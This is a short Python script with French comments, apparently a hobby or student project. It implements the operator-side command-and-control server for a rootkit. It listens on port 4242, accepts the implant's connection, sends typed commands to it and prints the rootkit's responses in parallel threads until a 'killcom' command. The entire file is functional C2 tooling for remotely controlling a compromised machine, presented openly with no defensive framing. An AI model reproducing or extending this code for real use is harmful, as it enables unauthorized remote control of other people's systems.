import socket
import threading
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

STD_BUFFER_SIZE = 1024

# Adresse IP et port sur lesquels le serveur va écouter
HOST = '0.0.0.0'  # 0.0.0.0 = toutes les interfaces réseau
PORT = 4242       # Port d'écoute choisi par sieur Thibounet

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"📡 [*] Attente d'une connexion sur {HOST}:{PORT}...")

    connection, addr = server_socket.accept()
    print(f"✅ [+] Rootkit connecté depuis {addr[0]}")

    from prompt_toolkit import PromptSession
    from prompt_toolkit.patch_stdout import patch_stdout

    def send_commands():
        session = PromptSession("🧠 Vous > ")
        with patch_stdout():
            while True:
                try:
                    line = session.prompt().strip()
                    if not line:
                        continue
                    to_send = line + "\n"
                    connection.sendall(to_send.encode())
                    print(f"📤 [>] Commande envoyée : {line}")
                    if 'killcom' in line.lower():
                        print("❌ [-] Fermeture demandée par l'utilisateur.")
                        break
                except (KeyboardInterrupt, EOFError):
                    print("\n⚠️ [!] Interruption utilisateur. Fermeture en cours...")
                    break
                except Exception as e:
                    print(f"💥 [!] Erreur : {e}")
                    break

    def receive_responses():
        while True:
            try:
                data = connection.recv(STD_BUFFER_SIZE).decode()
                if data:
                    print(f"\n📥 [rootkit] {data.strip()}")
                else:
                    break
            except Exception as e:
                print(f"💥 [!] Erreur lors de la réception : {e}")
                break

    try:
        # Lecture du premier message
        data = connection.recv(STD_BUFFER_SIZE).decode()
        if data:
            print(f"📥 [rootkit] {data.strip()}")

        send_thread = threading.Thread(target=send_commands, daemon=True)
        receive_thread = threading.Thread(target=receive_responses, daemon=True)

        send_thread.start()
        receive_thread.start()

        send_thread.join()

    finally:
        connection.close()
        server_socket.close()
        print("🔒 [*] Connexion fermée. Serveur éteint.")


# Le main quoi
if __name__ == '__main__':
    start_server()
